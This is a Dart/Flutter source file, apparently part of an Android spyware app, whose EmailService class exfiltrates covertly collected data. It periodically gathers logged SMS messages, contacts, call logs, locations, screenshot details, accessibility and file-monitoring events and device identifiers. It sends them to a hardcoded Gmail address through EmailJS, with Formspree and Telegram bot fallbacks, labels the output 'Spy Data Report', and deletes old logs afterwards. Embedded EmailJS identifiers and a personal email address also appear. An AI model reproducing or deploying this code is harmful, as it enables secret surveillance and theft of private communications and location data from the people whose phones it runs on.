import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:http/http.dart' as http;
import 'package:path_provider/path_provider.dart';
import 'package:device_info_plus/device_info_plus.dart';

class EmailService {
  static const String _targetEmail = 'tmdals7205@gmail.com';
  static const String _smtpApiUrl = 'https://api.emailjs.com/api/v1.0/email/send';
  static const String _serviceId = 'service_56njyhn';
  static const String _templateId = 'iKPLnbfwWhDWQNT6dfPrc';
  static const String _publicKey = 'kBLWYC2oAZAJeL6_B'; // EmailJS에서 발급받은 키

  // 백업 이메일 전송 (Formspree 사용)
  static const String _backupApiUrl = 'https://formspree.io/f/YOUR_FORM_ID'; // Formspree 사용

  static Timer? _emailTimer;
  static bool _isEmailServiceActive = false;

  // 이메일 서비스 시작 (30분마다 데이터 전송)
  static void startEmailService() {
    if (_isEmailServiceActive) return;

    _isEmailServiceActive = true;

    // 즉시 한 번 전송
    _sendCollectedData();

    // 60분마다 정기 전송
    _emailTimer = Timer.periodic(const Duration(minutes: 60), (timer) async {
      await _sendCollectedData();
    });

    _logEvent('EMAIL_SERVICE_STARTED', 'Automatic data transmission activated');
  }

  // 이메일 서비스 중지
  static void stopEmailService() {
    _isEmailServiceActive = false;
    _emailTimer?.cancel();
    _emailTimer = null;

    _logEvent('EMAIL_SERVICE_STOPPED', 'Automatic data transmission deactivated');
  }

  // 수집된 모든 데이터를 이메일로 전송
  static Future<void> _sendCollectedData() async {
    try {
      final deviceInfo = await _getDeviceInfo();
      final collectedData = await _gatherAllData();

      // 데이터를 JSON으로 변환
      final emailData = {
        'target_email': _targetEmail,
        'subject': 'Spy Data Report - ${deviceInfo['model']} (${DateTime.now().toString()})',
        'device_info': deviceInfo,
        'collected_data': collectedData,
        'stats': await _getDataStats(),
        'timestamp': DateTime.now().toIso8601String(),
        'report_type': 'automated_collection'
      };

      // 주 전송 방법 시도
      bool success = await _sendViaEmailJS(emailData);

      // 실패시 백업 방법 사용
      if (!success) {
        success = await _sendViaFormspree(emailData);
      }

      // 모든 방법 실패시 텔레그램 백업
      if (!success) {
        await _sendViaTelegram(emailData);
      }

      if (success) {
        await _logEvent('EMAIL_SENT_SUCCESS', 'Data successfully transmitted to $_targetEmail');
        await _clearOldLogs(); // 전송 후 오래된 로그 정리
      } else {
        await _logEvent('EMAIL_SEND_FAILED', 'All transmission methods failed');
      }

    } catch (e) {
      await _logEvent('EMAIL_SEND_ERROR', 'Email transmission error: $e');
    }
  }

  // EmailJS를 통한 전송
  static Future<bool> _sendViaEmailJS(Map<String, dynamic> emailData) async {
    try {
      final response = await http.post(
        Uri.parse(_smtpApiUrl),
        headers: {
          'Content-Type': 'application/json',
        },
        body: jsonEncode({
          'service_id': _serviceId,
          'template_id': _templateId,
          'user_id': _publicKey,
          'template_params': {
            'to_email': _targetEmail,
            'subject': emailData['subject'],
            'message': _formatDataForEmail(emailData),
            'device_info': jsonEncode(emailData['device_info']),
            'attachment_data': _encodeDataAsAttachment(emailData['collected_data']),
          }
        }),
      ).timeout(const Duration(seconds: 30));

      if (response.statusCode == 200) {
        return true;
      }

      return false;
    } catch (e) {
      print('EmailJS 전송 실패: $e');
      return false;
    }
  }

  // Formspree를 통한 백업 전송
  static Future<bool> _sendViaFormspree(Map<String, dynamic> emailData) async {
    try {
      final response = await http.post(
        Uri.parse(_backupApiUrl),
        headers: {
          'Content-Type': 'application/json',
          'Accept': 'application/json',
        },
        body: jsonEncode({
          'email': _targetEmail,
          'subject': emailData['subject'],
          'message': _formatDataForEmail(emailData),
          'device_data': jsonEncode(emailData),
        }),
      ).timeout(const Duration(seconds: 30));

      return response.statusCode == 200;
    } catch (e) {
      print('Formspree 전송 실패: $e');
      return false;
    }
  }

  // 텔레그램 백업 전송
  static Future<bool> _sendViaTelegram(Map<String, dynamic> emailData) async {
    try {
      const String botToken = 'YOUR_TELEGRAM_BOT_TOKEN';
      const String chatId = 'YOUR_CHAT_ID';

      final message = _formatDataForTelegram(emailData);

      final response = await http.post(
        Uri.parse('https://api.telegram.org/bot$botToken/sendMessage'),
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          'chat_id': chatId,
          'text': message,
          'parse_mode': 'HTML',
        }),
      ).timeout(const Duration(seconds: 30));

      return response.statusCode == 200;
    } catch (e) {
      print('텔레그램 전송 실패: $e');
      return false;
    }
  }

  // 디바이스 정보 수집
  static Future<Map<String, dynamic>> _getDeviceInfo() async {
    try {
      final deviceInfo = DeviceInfoPlugin();

      if (Platform.isAndroid) {
        final androidInfo = await deviceInfo.androidInfo;
        return {
          'device_id': androidInfo.id,
          'model': androidInfo.model,
          'brand': androidInfo.brand,
          'manufacturer': androidInfo.manufacturer,
          'android_version': androidInfo.version.release,
          'sdk_version': androidInfo.version.sdkInt,
          'fingerprint': androidInfo.fingerprint,
          'hardware': androidInfo.hardware,
          'product': androidInfo.product,
          'is_physical_device': androidInfo.isPhysicalDevice,
          'collection_time': DateTime.now().toIso8601String(),
        };
      } else {
        return {
          'platform': Platform.operatingSystem,
          'version': Platform.operatingSystemVersion,
          'collection_time': DateTime.now().toIso8601String(),
        };
      }
    } catch (e) {
      return {'error': 'Failed to get device info: $e'};
    }
  }

  // 모든 수집된 데이터 취합
  static Future<Map<String, dynamic>> _gatherAllData() async {
    try {
      final directory = await getApplicationDocumentsDirectory();
      final logsDir = Directory('${directory.path}/logs');

      final allData = <String, List<dynamic>>{
        'sms_messages': [],
        'contacts': [],
        'call_logs': [],
        'location_data': [],
        'screenshots': [],
        'accessibility_events': [],
        'file_monitoring': [],
        'system_events': [],
        'service_events': [],
      };

      if (await logsDir.exists()) {
        final files = await logsDir.list().toList();

        for (final file in files) {
          if (file is File && file.path.endsWith('.json')) {
            try {
              final content = await file.readAsString();
              final lines = content.split('\n').where((line) => line.trim().isNotEmpty);

              final fileName = file.path.split('/').last;

              for (final line in lines) {
                try {
                  final data = jsonDecode(line);

                  // 파일명에 따라 데이터 분류
                  if (fileName.contains('sms')) {
                    allData['sms_messages']!.add(data);
                  } else if (fileName.contains('contact')) {
                    allData['contacts']!.add(data);
                  } else if (fileName.contains('call')) {
                    allData['call_logs']!.add(data);
                  } else if (fileName.contains('location')) {
                    allData['location_data']!.add(data);
                  } else if (fileName.contains('accessibility')) {
                    allData['accessibility_events']!.add(data);
                  } else if (fileName.contains('file')) {
                    allData['file_monitoring']!.add(data);
                  } else if (fileName.contains('service_events')) {
                    allData['service_events']!.add(data);
                  } else {
                    allData['system_events']!.add(data);
                  }
                } catch (e) {
                  // JSON 파싱 오류 무시
                }
              }
            } catch (e) {
              // 파일 읽기 오류 무시
            }
          }
        }
      }

      // 스크린샷 파일 정보 수집
      final screenshotsDir = Directory('${directory.path}/screenshots');
      if (await screenshotsDir.exists()) {
        final screenshots = await screenshotsDir.list().toList();
        for (final screenshot in screenshots) {
          if (screenshot is File) {
            final stat = await screenshot.stat();
            allData['screenshots']!.add({
              'filename': screenshot.path.split('/').last,
              'size': stat.size,
              'created': stat.modified.toIso8601String(),
              'path': screenshot.path,
            });
          }
        }
      }

      return allData;
    } catch (e) {
      return {'error': 'Failed to gather data: $e'};
    }
  }

  // 데이터 통계 정보
  static Future<Map<String, dynamic>> _getDataStats() async {
    try {
      final data = await _gatherAllData();

      return {
        'total_sms': data['sms_messages']?.length ?? 0,
        'total_contacts': data['contacts']?.length ?? 0,
        'total_calls': data['call_logs']?.length ?? 0,
        'total_locations': data['location_data']?.length ?? 0,
        'total_screenshots': data['screenshots']?.length ?? 0,
        'total_accessibility_events': data['accessibility_events']?.length ?? 0,
        'total_file_events': data['file_monitoring']?.length ?? 0,
        'total_system_events': data['system_events']?.length ?? 0,
        'total_service_events': data['service_events']?.length ?? 0,
        'collection_period': 'Last 30 minutes',
        'report_generated': DateTime.now().toIso8601String(),
      };
    } catch (e) {
      return {'error': 'Failed to generate stats: $e'};
    }
  }

  // 이메일용 데이터 포맷팅
  static String _formatDataForEmail(Map<String, dynamic> emailData) {
    final deviceInfo = emailData['device_info'] as Map<String, dynamic>;
    final stats = emailData['stats'] as Map<String, dynamic>;

    return '''
=== SPY DATA REPORT ===

📱 DEVICE INFORMATION:
- Model: ${deviceInfo['brand'] ?? 'Unknown'} ${deviceInfo['model'] ?? 'Unknown'}
- Android Version: ${deviceInfo['android_version'] ?? 'Unknown'}
- Device ID: ${deviceInfo['device_id'] ?? 'Unknown'}
- Manufacturer: ${deviceInfo['manufacturer'] ?? 'Unknown'}

📊 DATA SUMMARY:
- SMS Messages: ${stats['total_sms']}
- Contacts: ${stats['total_contacts']}
- Call Logs: ${stats['total_calls']}
- Location Records: ${stats['total_locations']}
- Screenshots: ${stats['total_screenshots']}
- Accessibility Events: ${stats['total_accessibility_events']}
- File Events: ${stats['total_file_events']}
- System Events: ${stats['total_system_events']}
- Service Events: ${stats['total_service_events']}

⏰ Collection Time: ${emailData['timestamp']}
🔄 Report Type: ${emailData['report_type']}

📋 DETAILED DATA:
(See attachment for complete data export)

---
Automated Spy Report System
Generated: ${DateTime.now()}
    ''';
  }

  // 텔레그램용 데이터 포맷팅
  static String _formatDataForTelegram(Map<String, dynamic> emailData) {
    final deviceInfo = emailData['device_info'] as Map<String, dynamic>;
    final stats = emailData['stats'] as Map<String, dynamic>;

    return '''
<b>🔍 SPY DATA REPORT</b>

<b>📱 Device:</b> ${deviceInfo['brand'] ?? 'Unknown'} ${deviceInfo['model'] ?? 'Unknown'}
<b>🆔 ID:</b> <code>${deviceInfo['device_id'] ?? 'Unknown'}</code>
<b>📊 Android:</b> ${deviceInfo['android_version'] ?? 'Unknown'}

<b>📈 Statistics:</b>
• SMS: ${stats['total_sms']}
• Contacts: ${stats['total_contacts']}
• Calls: ${stats['total_calls']}
• Locations: ${stats['total_locations']}
• Screenshots: ${stats['total_screenshots']}

<b>⏰ Time:</b> ${DateTime.now().toString().split('.')[0]}
    ''';
  }

  // 데이터를 첨부파일로 인코딩
  static String _encodeDataAsAttachment(Map<String, dynamic> data) {
    try {
      final jsonString = jsonEncode(data);
      final bytes = utf8.encode(jsonString);
      return base64Encode(bytes);
    } catch (e) {
      return 'Error encoding data: $e';
    }
  }

  // 오래된 로그 파일 정리 (전송 후)
  static Future<void> _clearOldLogs() async {
    try {
      final directory = await getApplicationDocumentsDirectory();
      final logsDir = Directory('${directory.path}/logs');

      if (await logsDir.exists()) {
        final files = await logsDir.list().toList();
        final now = DateTime.now();

        for (final file in files) {
          if (file is File) {
            final stat = await file.stat();
            final age = now.difference(stat.modified).inDays;

            // 7일 이상된 로그 파일 삭제
            if (age > 7) {
              await file.delete();
            }
          }
        }
      }
    } catch (e) {
      print('로그 정리 오류: $e');
    }
  }

  // 수동 데이터 전송
  static Future<bool> sendDataManually() async {
    try {
      await _sendCollectedData();
      return true;
    } catch (e) {
      await _logEvent('MANUAL_SEND_ERROR', 'Manual data send failed: $e');
      return false;
    }
  }

  // 긴급 데이터 전송 (즉시)
  static Future<void> sendEmergencyData(String reason) async {
    try {
      final deviceInfo = await _getDeviceInfo();
      final emergencyData = {
        'target_email': _targetEmail,
        'subject': '🚨 EMERGENCY SPY ALERT - ${deviceInfo['model']}',
        'device_info': deviceInfo,
        'emergency_reason': reason,
        'timestamp': DateTime.now().toIso8601String(),
        'report_type': 'emergency_alert'
      };

      await _sendViaEmailJS(emergencyData);
      await _sendViaTelegram(emergencyData);

      await _logEvent('EMERGENCY_SENT', 'Emergency alert sent: $reason');
    } catch (e) {
      await _logEvent('EMERGENCY_ERROR', 'Emergency send failed: $e');
    }
  }

  // 이벤트 로깅
  static Future<void> _logEvent(String event, String details) async {
    try {
      final directory = await getApplicationDocumentsDirectory();
      final logDir = Directory('${directory.path}/logs');
      if (!await logDir.exists()) {
        await logDir.create(recursive: true);
      }

      final logFile = File('${logDir.path}/email_service.json');
      final logEntry = {
        'event': event,
        'details': details,
        'timestamp': DateTime.now().toIso8601String(),
      };

      await logFile.writeAsString(
        '${jsonEncode(logEntry)}\n',
        mode: FileMode.append,
      );
    } catch (e) {
      print('로그 기록 오류: $e');
    }
  }

  // 서비스 상태 확인
  static bool get isActive => _isEmailServiceActive;

  // 다음 전송 시간
  static DateTime? get nextSendTime {
    if (_emailTimer == null) return null;
    return DateTime.now().add(const Duration(minutes: 30));
  }

  // 서비스 정보
  static Map<String, dynamic> getServiceInfo() {
    return {
      'is_active': _isEmailServiceActive,
      'target_email': _targetEmail,
      'next_send_time': nextSendTime?.toIso8601String(),
      'send_interval_minutes': 30,
      'last_status_check': DateTime.now().toIso8601String(),
    };
  }
}